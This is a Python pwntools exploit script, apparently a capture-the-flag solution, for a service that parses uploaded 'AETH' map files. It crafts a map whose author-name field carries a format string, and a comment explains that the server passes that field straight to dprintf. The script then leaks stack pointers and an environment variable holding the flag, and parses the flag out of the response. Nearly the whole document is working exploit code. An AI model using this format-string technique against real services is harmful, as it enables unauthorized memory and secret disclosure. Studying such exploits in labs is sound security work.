from pwn import *
import struct, re, sys

context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7777


def build_aeth_map(author_bytes=b"a", map_name=b"m" * 0x2e, width=1, height=1, desc=b"DESC"):
    size = 0xE0
    buf = bytearray(b'\x00' * size)
    buf[0:4] = b'AETH'
    buf[6:8] = struct.pack('<H', width)
    buf[8:10] = struct.pack('<H', height)
    buf[0x10:0x10 + min(len(map_name), 0x2f)] = map_name[:0x2f]
    buf[0x40:0x40 + min(len(author_bytes), 0x1f)] = author_bytes[:0x1f]
    buf[0x60:0x60 + min(len(desc), 0x7f)] = desc[:0x7f]
    return bytes(buf)


r = remote(HOST, PORT)
r.recvuntil(b"> ")

# parse_map does:
#   dprintf(fd, m->author_name, puts, malloc, free, husk_ritual, archive_note());
# author_name is our raw upload bytes -> full format-string control.
# archive_note() returns getenv("AETHERIA_ARCHIVE_NOTE") -- the 5th vararg.
# %5$s leaks it directly, no heap corruption required at all.
fmt = b"%1$p.%2$p.%3$p.%4$p.%5$s".ljust(0x1f, b'\x00')
raw = build_aeth_map(fmt)
r.send(b"UPLOAD %d\n" % len(raw))
r.send(raw)
data = r.recvuntil(b"> ", timeout=3)
log.info("raw response: %r" % data)

m = re.search(rb"uploaded by (?:0x[0-9a-f]+\.){4}(.*?)\nmap \d+ stored", data, re.DOTALL)
if not m:
    log.failure("could not parse leak")
    r.interactive()
    sys.exit(1)

note = m.group(1).decode(errors="replace")
log.success("AETHERIA_ARCHIVE_NOTE leaked: %s" % note)

flag_match = re.search(r"[A-Za-z0-9_]*\{[^\n}]*\}", note)
if flag_match:
    log.success("FLAG: %s" % flag_match.group(0))
else:
    log.warning("Leaked note does not look like a flag (probably the default placeholder).")

r.close()
